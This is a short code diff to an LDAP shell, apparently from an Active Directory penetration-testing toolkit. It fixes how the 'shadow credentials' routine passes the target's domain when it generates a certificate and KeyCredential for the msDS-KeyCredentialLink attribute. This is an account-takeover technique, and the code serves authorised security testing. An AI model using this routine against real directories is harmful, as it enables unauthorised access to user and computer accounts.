@@ -633,10 +633,13 @@ class LdapShell(cmd.Cmd):
         print("Found Target DN: %s" % target.entry_dn)
         print("Target SID: %s\n" % target_sid)
 
+        # Get the domain the target is in
+        domain = re.sub(',DC=', '.', target.entry_dn[target.entry_dn.find('DC='):], flags=re.I)[3:]
+
         existing_key_credential_count = len(target['msDS-KeyCredentialLink'].raw_values)
         print("Found %d existing KeyCredential(s)" % existing_key_credential_count)
 
-        key, certificate = shadow_credentials.createSelfSignedX509Certificate(subject=target_name)
+        key, certificate = shadow_credentials.createSelfSignedX509Certificate(subject=target_name, domain=domain)
         device_id = shadow_credentials.getDeviceId()
         keyCredential = shadow_credentials.KeyCredential(key, deviceId=device_id, currentTime=shadow_credentials.getTicksNow())
         print("KeyCredential generated with DeviceID: %s" % uuid.UUID(bytes=device_id))
